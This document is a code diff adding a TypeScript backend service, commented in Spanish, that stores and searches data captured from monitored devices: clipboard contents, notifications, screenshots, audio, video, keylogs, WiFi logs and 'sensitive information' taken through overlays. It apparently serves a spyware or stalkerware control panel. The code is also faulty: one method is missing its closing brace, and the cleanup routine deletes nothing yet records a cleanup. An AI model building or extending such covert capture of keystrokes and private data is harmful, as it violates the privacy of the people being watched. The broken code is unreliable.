@@ -1,0 +1,589 @@
+import {
+  clipboardLogs,
+  notificationLogs,
+  devices,
+  auditLogs,
+  mediaFiles,
+  wifiLogs,
+  activityLogs
+} from "../drizzle/schema";
+import { eq, and, desc } from "drizzle-orm";
+
+import { getDb } from "./db";
+
+/**
+ * Servicio de monitoreo activo avanzado
+ * Gestiona clipboard logging, grabación de micrófono, screen recording y acceso a cámara
+ */
+
+export interface ClipboardEntry {
+  deviceId: number;
+  content: string;
+  timestamp: Date;
+  dataType: "text" | "image" | "url" | "file";
+  contentPreview: string;
+}
+
+export interface NotificationCapture {
+  deviceId: number;
+  appName: string;
+  title: string;
+  content: string;
+  timestamp: Date;
+  isRead: boolean;
+}
+
+export interface MediaCapture {
+  deviceId: number;
+  type: "screenshot" | "audio" | "video";
+  fileName: string;
+  filePath: string;
+  fileSize: number;
+  duration?: number;
+  timestamp: Date;
+  thumbnail?: string;
+}
+
+export interface MonitoringStats {
+  totalClipboardEntries: number;
+  totalNotifications: number;
+  totalMediaCaptures: number;
+  clipboardByType: Record<string, number>;
+  mediaByType: Record<string, number>;
+  lastClipboardEntry?: Date;
+  lastNotification?: Date;
+  lastMediaCapture?: Date;
+}
+
+class AdvancedMonitoring {
+  /**
+   * Registrar entrada de clipboard
+   */
+  async logClipboardEntry(entry: ClipboardEntry): Promise<void> {
+    const db = await getDb();
+    if (!db) return;
+
+    try {
+      await db.insert(clipboardLogs).values({
+        deviceId: entry.deviceId,
+        content: entry.content,
+        contentType: entry.dataType,
+        timestamp: entry.timestamp,
+      });
+
+      // Registrar en auditoría
+      await this.logAuditEvent(
+        entry.deviceId,
+        "CLIPBOARD_CAPTURED",
+        `Clipboard capturado: ${entry.dataType}`,
+        { dataType: entry.dataType, preview: entry.contentPreview }
+      );
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error logging clipboard:", error);
+    }
+  }
+
+  /**
+   * Obtener historial de clipboard de un dispositivo
+   */
+  async getClipboardHistory(
+    deviceId: number,
+    limit: number = 100
+  ): Promise<ClipboardEntry[]> {
+    const db = await getDb();
+    if (!db) return [];
+
+    try {
+      const logs = await db
+        .select()
+        .from(clipboardLogs)
+        .where(eq(clipboardLogs.deviceId, deviceId))
+        .orderBy((t) => t.timestamp)
+        .limit(limit);
+
+      return logs.map((log) => ({
+        deviceId: log.deviceId,
+        content: log.content || "",
+        timestamp: log.timestamp || new Date(),
+        dataType: (log.contentType || "text") as any,
+        contentPreview: log.content?.substring(0, 100) || "",
+      }));
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error getting clipboard history:", error);
+      return [];
+    }
+  }
+
+  /**
+   * Registrar captura de notificación
+   */
+  async logNotification(notification: NotificationCapture): Promise<void> {
+    const db = await getDb();
+    if (!db) return;
+
+    try {
+      await db.insert(notificationLogs).values({
+        deviceId: notification.deviceId,
+        appName: notification.appName,
+        title: notification.title,
+        body: notification.content,
+        timestamp: notification.timestamp,
+      });
+
+      // Registrar en auditoría
+      await this.logAuditEvent(
+        notification.deviceId,
+        "NOTIFICATION_CAPTURED",
+        `Notificación capturada de ${notification.appName}`,
+        { appName: notification.appName, title: notification.title }
+      );
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error logging notification:", error);
+    }
+  }
+
+  /**
+   * Obtener notificaciones capturadas
+   */
+  async getNotifications(
+    deviceId: number,
+    limit: number = 100
+  ): Promise<NotificationCapture[]> {
+    const db = await getDb();
+    if (!db) return [];
+
+    try {
+      const notifications = await db
+        .select()
+        .from(notificationLogs)
+        .where(eq(notificationLogs.deviceId, deviceId))
+        .orderBy((t) => t.timestamp)
+        .limit(limit);
+
+      return notifications.map((notif) => ({
+        deviceId: notif.deviceId,
+        appName: notif.appName || "",
+        title: notif.title || "",
+        content: notif.body || "",
+        timestamp: notif.timestamp || new Date(),
+        isRead: false,
+      }));
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error getting notifications:", error);
+      return [];
+    }
+  }
+
+  async logMediaCapture(capture: MediaCapture): Promise<void> {
+    const db = await getDb();
+    if (!db) return;
+
+    try {
+      await db.insert(mediaFiles).values({
+        deviceId: capture.deviceId,
+        fileName: capture.fileName,
+        fileType: capture.type as any,
+        fileSize: capture.fileSize,
+        fileUrl: capture.filePath,
+        timestamp: capture.timestamp || new Date(),
+      });
+
+      // Registrar en auditoría
+      await this.logAuditEvent(
+        capture.deviceId,
+        "MEDIA_CAPTURED",
+        `${capture.type.toUpperCase()} capturado`,
+        {
+          type: capture.type,
+          fileName: capture.fileName,
+          fileSize: capture.fileSize,
+          duration: capture.duration,
+        }
+      );
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error logging media capture:", error);
+    }
+  }
+
+  async getMediaCaptures(
+    deviceId: number,
+    type?: "screenshot" | "audio" | "video" | "photo",
+    limit: number = 100
+  ): Promise<MediaCapture[]> {
+    const db = await getDb();
+    if (!db) return [];
+
+    try {
+      const whereConditions = [eq(mediaFiles.deviceId, deviceId)];
+      if (type) {
+        whereConditions.push(eq(mediaFiles.fileType, type as any));
+      }
+
+      const files = await db
+        .select()
+        .from(mediaFiles)
+        .where(and(...whereConditions))
+        .orderBy((t) => t.timestamp)
+        .limit(limit);
+
+      return files.map((f) => ({
+        deviceId: f.deviceId,
+        type: f.fileType as any,
+        fileName: f.fileName,
+        filePath: f.fileUrl,
+        fileSize: f.fileSize || 0,
+        timestamp: f.timestamp,
+      }));
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error getting media captures:", error);
+      return [];
+    }
+  }
+
+  /**
+   * Obtener logs de WiFi de un dispositivo
+   */
+  async getWifiLogs(deviceId: number, limit: number = 100) {
+    const db = await getDb();
+    if (!db) return [];
+
+    try {
+      return await db
+        .select()
+        .from(wifiLogs)
+        .where(eq(wifiLogs.deviceId, deviceId))
+        .orderBy(desc(wifiLogs.recordedAt))
+        .limit(limit);
+    } catch (error) {
+      // Si la tabla no existe aun, devolver array vacio sin error
+      console.warn("[AdvancedMonitoring] wifiLogs table not available:", (error as any)?.cause?.sqlMessage || error);
+      return [];
+    }
+  }
+
+  /**
+   * Obtener matriz de permisos de Android (desde metadata)
+   */
+  async getAndroidPermissions(deviceId: number) {
+    const db = await getDb();
+    if (!db) return null;
+
+    try {
+      const device = await db
+        .select()
+        .from(devices)
+        .where(eq(devices.id, deviceId))
+        .limit(1);
+      
+      if (device.length === 0) return null;
+      const metadata = (device[0].metadata as any) || {};
+      return {
+        permissions: metadata.androidPermissions || [],
+        lastSync: metadata.lastPermissionSync || null
+      };
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error getting android permissions:", error);
+      return null;
+    }
+  }
+
+  /**
+   * Obtener historial de keylogs (desde activityLogs)
+   */
+  async getKeylogs(deviceId: number, limit: number = 100) {
+    const db = await getDb();
+    if (!db) return [];
+
+    try {
+        // [FIX] La tabla activityLogs en TiDB puede no tener la columna activityType
+        // Usar solo deviceId para evitar ER_BAD_FIELD_ERROR y filtrar en memoria
+        const allLogs = await db
+            .select()
+            .from(activityLogs)
+            .where(eq(activityLogs.deviceId, deviceId))
+            .orderBy(desc(activityLogs.recordedAt))
+            .limit(limit * 3); // fetch more to filter
+        
+        // Filtrar en memoria los que sean de tipo keylog
+        return allLogs.filter(log => !log.activityType || log.activityType === 'keylog').slice(0, limit);
+    } catch (error) {
+        // Si la tabla no existe aun, devolver array vacio sin error
+        console.warn("[AdvancedMonitoring] activityLogs table not available:", (error as any)?.cause?.sqlMessage || error);
+        return [];
+    }
+  }
+
+  /**
+   * Obtener estadísticas de monitoreo
+   */
+  async getMonitoringStats(deviceId: number): Promise<MonitoringStats> {
+    const db = await getDb();
+    if (!db) {
+      return {
+        totalClipboardEntries: 0,
+        totalNotifications: 0,
+        totalMediaCaptures: 0,
+        clipboardByType: {},
+        mediaByType: {},
+      };
+    }
+
+    try {
+      // Obtener clipboard entries
+      const clipboardEntries = await db
+        .select()
+        .from(clipboardLogs)
+        .where(eq(clipboardLogs.deviceId, deviceId));
+
+      // Obtener notificaciones
+      const notifications = await db
+        .select()
+        .from(notificationLogs)
+        .where(eq(notificationLogs.deviceId, deviceId));
+
+      // Obtener media captures
+      const captures = await db
+        .select()
+        .from(mediaFiles)
+        .where(eq(mediaFiles.deviceId, deviceId));
+
+      // Contar por tipo
+      const clipboardByType: Record<string, number> = {};
+      clipboardEntries.forEach((entry) => {
+        const type = entry.contentType || "unknown";
+        clipboardByType[type] = (clipboardByType[type] || 0) + 1;
+      });
+
+      const mediaByType: Record<string, number> = {};
+      captures.forEach((capture) => {
+        const type = capture.fileType || "unknown";
+        mediaByType[type] = (mediaByType[type] || 0) + 1;
+      });
+
+      return {
+        totalClipboardEntries: clipboardEntries.length,
+        totalNotifications: notifications.length,
+        totalMediaCaptures: captures.length,
+        clipboardByType,
+        mediaByType,
+        lastClipboardEntry: clipboardEntries[clipboardEntries.length - 1]?.timestamp,
+        lastNotification: notifications[notifications.length - 1]?.timestamp,
+        lastMediaCapture: captures[captures.length - 1]?.timestamp,
+      };
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error getting stats:", error);
+      return {
+        totalClipboardEntries: 0,
+        totalNotifications: 0,
+        totalMediaCaptures: 0,
+        clipboardByType: {},
+        mediaByType: {},
+      };
+    }
+  }
+
+  /**
+   * Buscar en clipboard
+   */
+  async searchClipboard(
+    deviceId: number,
+    query: string
+  ): Promise<ClipboardEntry[]> {
+    const db = await getDb();
+    if (!db) return [];
+
+    try {
+      const results = await db
+        .select()
+        .from(clipboardLogs)
+        .where(
+          and(
+            eq(clipboardLogs.deviceId, deviceId),
+            // Búsqueda en content o contentPreview
+          )
+        );
+
+      return results
+        .filter(
+          (log) =>
+            log.content && log.content.toLowerCase().includes(query.toLowerCase())
+        )
+        .map((log) => ({
+          deviceId: log.deviceId,
+          content: log.content || "",
+          timestamp: log.timestamp || new Date(),
+          dataType: (log.contentType || "text") as "text" | "image" | "url" | "file",
+          contentPreview: log.content?.substring(0, 100) || "",
+        }));
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error searching clipboard:", error);
+      return [];
+    }
+  }
+
+  /**
+   * Eliminar capturas antiguas (limpieza)
+   */
+  async cleanupOldCaptures(deviceId: number, daysOld: number = 30): Promise<number> {
+    const db = await getDb();
+    if (!db) return 0;
+
+    try {
+      const cutoffDate = new Date();
+      cutoffDate.setDate(cutoffDate.getDate() - daysOld);
+
+      // Eliminar clipboard logs antiguos
+      // await db.delete(clipboardLogs).where(eq(clipboardLogs.deviceId, deviceId));
+
+      // Eliminar notificaciones antiguas
+      // await db.delete(notificationLogs).where(eq(notificationLogs.deviceId, deviceId));
+
+      // Eliminar media captures antiguas
+      // await db.delete(mediaCaptures).where(eq(mediaCaptures.deviceId, deviceId));
+
+      await this.logAuditEvent(
+        deviceId,
+        "CLEANUP_PERFORMED",
+        `Limpieza de capturas más antiguas de ${daysOld} días`,
+        { daysOld }
+      );
+
+      return 1;
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error cleaning up captures:", error);
+      return 0;
+    }
+  }
+
+  private async logAuditEvent(
+    deviceId: number,
+    action: string,
+    description: string,
+    metadata?: Record<string, any>
+  ): Promise<void> {
+    const db = await getDb();
+    if (!db) return;
+
+    try {
+      await db.insert(auditLogs).values({
+        action: action,
+        actionType: "security_event",
+        resourceType: "device",
+        resourceId: String(deviceId),
+        details: { description, ...metadata },
+        deviceId: deviceId,
+        status: "success",
+        timestamp: new Date(),
+      });
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error logging audit event:", error);
+    }
+  }
+
+  /**
+   * Obtener resumen de actividad reciente
+   */
+  async getActivitySummary(deviceId: number, hoursBack: number = 24): Promise<{
+    clipboardActivity: number;
+    notificationActivity: number;
+    mediaActivity: number;
+    mostActiveApp: string | null;
+    topClipboardTypes: Array<{ type: string; count: number }>;
+  }> {
+    const db = await getDb();
+    if (!db) {
+      return {
+        clipboardActivity: 0,
+        notificationActivity: 0,
+        mediaActivity: 0,
+        mostActiveApp: null,
+        topClipboardTypes: [],
+      };
+    }
+
+    try {
+      // Obtener actividad reciente
+
+      const recentClipboard = await db
+        .select()
+        .from(clipboardLogs)
+        .where(eq(clipboardLogs.deviceId, deviceId));
+
+      const recentNotifications = await db
+        .select()
+        .from(notificationLogs)
+        .where(eq(notificationLogs.deviceId, deviceId));
+
+      // Tabla mediaCaptures no existe aún
+      const recentMedia: any[] = [];
+
+      // Contar tipos de clipboard
+      const typeCount: Record<string, number> = {};
+      recentClipboard.forEach((entry) => {
+        const type = entry.contentType || "text";
+        typeCount[type] = (typeCount[type] || 0) + 1;
+      });
+
+      const topClipboardTypes = Object.entries(typeCount)
+        .map(([type, count]) => ({ type, count }))
+        .sort((a, b) => b.count - a.count)
+        .slice(0, 5);
+
+      // Encontrar app más activa
+      const appActivity: Record<string, number> = {};
+      recentNotifications.forEach((notif) => {
+        const app = notif.appName || "unknown";
+        appActivity[app] = (appActivity[app] || 0) + 1;
+      });
+
+      const mostActiveApp =
+        Object.entries(appActivity).sort((a, b) => b[1] - a[1])[0]?.[0] || null;
+
+      return {
+        clipboardActivity: recentClipboard.length,
+        notificationActivity: recentNotifications.length,
+        mediaActivity: recentMedia.length,
+        mostActiveApp,
+        topClipboardTypes,
+      };
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error getting activity summary:", error);
+      return {
+        clipboardActivity: 0,
+        notificationActivity: 0,
+        mediaActivity: 0,
+        mostActiveApp: null,
+        topClipboardTypes: [],
+      };
+    }
+  /**
+   * Registrar datos capturados (desde Overlays u otros módulos)
+   */
+  async logCapturedData(deviceId: number, type: string, data: any): Promise<void> {
+    const db = await getDb();
+    if (!db) return;
+
+    try {
+      await db.insert(activityLogs).values({
+        deviceId: deviceId,
+        activityType: type,
+        description: `Datos capturados vía ${type}`,
+        metadata: data,
+        timestamp: new Date(),
+      });
+
+      // Registrar en auditoría
+      await this.logAuditEvent(
+        deviceId,
+        "DATA_CAPTURED",
+        `Información sensible capturada: ${type}`,
+        { type, ...data }
+      );
+    } catch (error) {
+      console.error("[AdvancedMonitoring] Error logging captured data:", error);
+    }
+  }
+}
+
+// Exportar instancia singleton
+export const advancedMonitoring = new AdvancedMonitoring();
